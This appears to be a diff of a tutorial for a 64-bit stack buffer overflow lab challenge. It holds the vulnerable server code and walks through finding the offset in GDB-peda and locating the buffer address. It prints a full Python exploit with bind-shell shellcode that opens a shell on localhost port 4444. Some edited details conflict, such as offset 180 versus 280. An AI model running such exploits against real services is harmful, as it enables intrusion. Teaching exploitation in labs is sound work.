@@ -26,10 +26,7 @@ const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULL
 
 int checkPassword(char *password) {
 	char *hash;
-
-	// $6$ is SHA256
 	hash = crypt(password, "$6$saaaaalty");
-
 	if (strcmp(hash, adminHash) == 0) {
 		return 1;
 	} else {
@@ -57,19 +54,14 @@ void doprocessing (int sock) {
 	char username[1024];
 	char password[1024];
 
-	printf("Client connected\n");
-
 	bzero(username, sizeof(username));
 	bzero(password, sizeof(password));
 
+	printf("Client connected\n");
+
 	int n;
-
 	n = read(sock, username, 1023);
-	//n = read(sock, password, 1023);
-
 	printf("Username: %s\n", username);
-	//printf("Password: %s\n", password);
-
 	handleData(username, password);
 }
 
@@ -117,7 +109,7 @@ int main( int argc, char *argv[] ) {
          perror("ERROR on accept");
          exit(1);
       }
-  /* Create child process */
+      /* Create child process */
       pid = fork();
 
       if (pid < 0) {
@@ -147,27 +139,25 @@ The vulnerability lies here:
 
 ```
 void handleData(char *username, char *password) {
-	[...]
+	...
 	char firstname[256];
-
-	[...]
+	...
 	strcpy(firstname, username);
-	[...]
+	...
 }
 
 
 void doprocessing (int sock) {
 	char username[1024];
-	[...]
+	...
 	int n;
-
-	n = read(sock, username, 1023);
-	[...]
+	n = read(sock, username, 1024);
+	...
 	handleData(username, password);
 }
 ```
 
-The server reads a maximum of 1023 bytes, and copies it into a username buffer
+The server reads a maximum of 1024 bytes, and copies it into a username buffer
 of size 1024 bytes. It then gives this buffer to the function `handleData` as
 argument `username`, which in turn copies it in a buffer which is only 256 bytes.
 
@@ -181,62 +171,103 @@ The program may hang. If you debug it again, you have to kill it:
 root@hlUbuntu64:~/challenges/challenge13# ./challenge13
 ERROR on binding: Address already in use
 
-root@hlUbuntu64:~/challenges/challenge13# ps axw | grep challenge13
-16799 pts/1    S      0:00 /root/challenges/challenge13/challenge13
-16825 pts/1    S+     0:00 grep --color=auto challenge13
-root@hlUbuntu64:~/challenges/challenge13# kill 16799
+root@hlUbuntu64:~/challenges/challenge13# pkill challenge13
+root@hlUbuntu64:~/challenges/challenge13# pkill gdb  # for good measure
 ```
 
-### Re-attaching
+### Debug the server
 
-Set `follow-fork-mode child` in GDB to follow the children.
+Set `follow-fork-mode child` in GDB to follow the children (should be enabled by default).
+
+Start the server in the background:
+```
+root@hlUbuntu64:~/challenges/challenge13# ./challenge13 &
+[1] 12345
+```
+
+Note the PID. Start gdb, and attach the the server (-parent). The process will be stopped, so we
+continue with `c`:
+```
+root@hlUbuntu64:~/challenges/challenge13# gdb -q
+gdb-peda$ attach 12345
+...
+gdb-peda$ c
+```
+
+The `attach` command is in the GDB command history.
 Reattach to the parent when the child crashed:
 
-Start GDB:
+Every time the server spawn a child, GDB will follow it. When you are finished debugging,
+and want to try the next version of the exploit, reattach and continue (`attach 12345` then `c`)
 
+
+## Finding the offset
+
+The offset should be 280. You should verify this by sending a payload, and obsever the output in GDB:
 ```
-root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
-Reading symbols from ./challenge13...(no debugging symbols found)...done.
-gdb-peda$ set follow-fork-mode child
-gdb-peda$ r
-Starting program: /root/challenges/challenge13/challenge13
-[New process 16843]
+root@hlUbuntu64:~/challenges/challenge13# python -c 'import sys; sys.stdout.write("XXXX" + "A" * (280-4) + "BBBB"') | nc localhost 5001
+```
+Note we use `sys.stdout.write()` instead of `print()`, as the latter will always output a newline, while `write()` doesnt. There is also a extra
+pattern of "XXXX" at the beginning, which will be used shortly.
+
+Payload:
+```
+XXXXAAAAA...AAAAAABBBB
 ```
 
-Start the exploit:
+GDB will show something like:
 ```
-root@hlUbuntu64:~/challenges/challenge13# python challenge13-exp-skel.py | nc localhost 5001
-```
-
-Output of GDB:
-```
-[...]
+RIP: 0x42424242 ('BBBB\n')
+...
 Stopped reason: SIGSEGV
-0x0000000041414141 in ?? ()
+0x0000000042424242 in ?? ()
 ```
 
-Find out PID of parent:
-```
-root@hlUbuntu64:~/challenges/challenge13# ps axw | grep challenge13
-16835 pts/1    S+     0:00 gdb -q ./challenge13
-16837 pts/1    S      0:00 /root/challenges/challenge13/challenge13
-16843 pts/1    t      0:00 /root/challenges/challenge13/challenge13
-16845 pts/2    S+     0:00 grep --color=auto challenge13
-```
+## Find the memory address
 
-Re-attach to parent:
+The GDB plugin Peda provides a function to search the memory for a pattern. As we already have the
+child process crashed with out pattern in GDB, lets get the memory address:
+
 ```
-gdb-peda$ attach 16837
-Attaching to program: /root/challenges/challenge13/challenge13, process 16837
-gdb-peda$ c
-Continuing.
+gdb-peda$ find XXXX
+Searching for 'XXXX' in: None ranges
+Found 3 results, display max 3 items:
+   libc : 0x7ffff79626bc --> 0x2e00585858585858 ('XXXXXX')
+[stack] : 0x7fffffffdbf0 ("XXXX", 'A' <repeats 196 times>...)
+[stack] : 0x7fffffffe120 ("XXXX", 'A' <repeats 196 times>...)
 ```
 
-## Overwrite SIP
+Lets try the last one: `0x7fffffffe120`:
 
-Here is the prepared exploit. The offset is already correct (at 280 bytes).
+```
+gdb-peda$ x/32x 0x7fffffffe120
+0x7fffffffe120: 0x58    0x58    0x58    0x58    0x41    0x41    0x41    0x41
+0x7fffffffe128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0x7fffffffe130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0x7fffffffe138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+gdb-peda$ x/1s 0x7fffffffe120
+0x7fffffffe120: "XXXX", 'A' <repeats 196 times>...
+```
 
+Looking good.
+
+## Exploit
+
+Copy the file `challenge13-exp-skel.py`, open it and make the following changes.
+
+We use the shellcode address `0x7fffffffe120`. Convert the address with `[::-1]` in little-endian format.
 ```python
+ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]
+```
+
+Use the verified offset: `180`
+```
+offset = 280
+```
+
+Full exploit:
+```
+root@hlUbuntu64:~/challenges/challenge13# cat challenge13-exp-skel.py
 #!/usr/bin/python
 
 import sys
@@ -246,135 +277,29 @@ shellcode = "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef" + "\xff\x
 
 buf_size = 256
 offset = 280
+ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]
 
-ret_addr = "AAAA"
-
-# 64 bytes
 exploit = "\x90" * (buf_size - len(shellcode))
 exploit += shellcode
-
-# fill a bit
 exploit += "A" * (offset - len(exploit))
-
 exploit += ret_addr
 
 sys.stdout.write(exploit)
 ```
 
-Start the server:
+Reattach GDB to the parent, and test it:
 ```
-root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
-Reading symbols from ./challenge13...(no debugging symbols found)...done.
-gdb-peda$ set follow-fork-mode child
-gdb-peda$ run
-Starting program: /root/challenges/challenge13/challenge13
+root@hlUbuntu64:~/challenges/challenge13# ./challenge13-exp.py | nc localhost 5001
+
 ```
 
-Execute the exploit POC:
+If everything works, the exploit will block. Open a new terminal, and connect
+to localhost:4444, where the shellcode started our shell:
 ```
-root@hlUbuntu64:~/challenges/challenge13# python challenge13-exp-skel.py | nc localhost 5001
-```
-
-Result:
-```
-Client connected
-Username: [...]
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
-
-Thread 2.1 "challenge13" received signal SIGSEGV, Segmentation fault.
-[Switching to process 16794]
-
-
- [----------------------------------registers-----------------------------------]
-RAX: 0x3a (':')
-RBX: 0x0
-RCX: 0x7fffffc6
-RDX: 0x7ffff7b9b780 --> 0x0
-RSI: 0x1
-RDI: 0x1
-RBP: 0x4141414141414141 ('AAAAAAAA')
-RSP: 0x7fffffffdbc0 --> 0x37ffff1a0
-RIP: 0x41414141 ('AAAA')
-R8 : 0x0
-R9 : 0x3a (':')
-R10: 0x0
-R11: 0x246
-R12: 0x400930 (<_start>:        xor    ebp,ebp)
-R13: 0x7fffffffe620 --> 0x1
-R14: 0x0
-R15: 0x0
-EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-Invalid $PC address: 0x41414141
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdbc0 --> 0x37ffff1a0
-0008| 0x7fffffffdbc8 --> 0x4ffffdd20
-0016| 0x7fffffffdbd0 --> 0x0
-0024| 0x7fffffffdbd8 --> 0x0
-0032| 0x7fffffffdbe0 --> 0x0
-0040| 0x7fffffffdbe8 --> 0x0
-0048| 0x7fffffffdbf0 --> 0x0
-0056| 0x7fffffffdbf8 --> 0x0
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x0000000041414141 in ?? ()
-gdb-peda$
-```
-
-We have correctly overwritten SIP with `0x41414141`, as RIP is `0x0000000041414141`.
-
-The shellcode is located at position `0x7fffffffdfd8`:
-```
-gdb-peda$ x/32x 0x7fffffffdf08
-0x7fffffffdf08: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf18: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf28: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf38: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf48: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf58: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf68: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf78: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf88: 0x0000000000000000      0x0000000000000000
-0x7fffffffdf98: 0x0000000000000000      0x0000000000000000
-0x7fffffffdfa8: 0x0000000000000000      0x0000000000000000
-0x7fffffffdfb8: 0x0000000000000000      0x0000000000000000
-0x7fffffffdfc8: 0x0000000000000000      0x9090909090909090
-0x7fffffffdfd8: 0x9090909090909090      0x9090909090909090
-0x7fffffffdfe8: 0x9090909090909090      0x9090909090909090
-0x7fffffffdff8: 0x9090909090909090      0x9090909090909090
-```
-
-## Exploit
-
-We use the shellcode address `0x7fffffffdfd8`:
-```python
-ret_addr = "AAAA"
-ret_addr = "\x7f\xff\xff\xff\xdf\xf8"[::-1]
-```
-
-We convert the address with `[::-1]` in little-endian format.
-
-Test it:
-```
-root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
-Reading symbols from ./challenge13...(no debugging symbols found)...done.
-gdb-peda$ set follow-fork-mode child
-gdb-peda$ r
-Starting program: /root/challenges/challenge13/challenge13
-[New process 16806]
-Client connected
-Username: [...]
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
-```
-
-Afterwards we can connect to localhost:4444, where the shellcode started our shell:
-```
-root@hlUbuntu64:~/challenges/challenge13# nc localhost 4444
+root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
+nc: connect to localhost port 4444 (tcp) failed: Connection refused
+root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
+Connection to localhost 4444 port [tcp/*] succeeded!
 ls
 Makefile
 challenge13
@@ -384,16 +309,9 @@ challenge13.c
 peda-session-challenge13.txt
 ```
 
-GDB will provide some more output:
-```
-process 16806 is executing new program: /bin/dash
-[New process 16808]
-process 16808 is executing new program: /bin/ls
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-[Inferior 3 (process 16808) exited normally]
-Warning: not running or target is remote
-```
+Use nc parameter `-v` to know if it was able to connect or not.
+Note that there is no output if you just connect, you need to type in a command.
+
 
 ## Questions
 
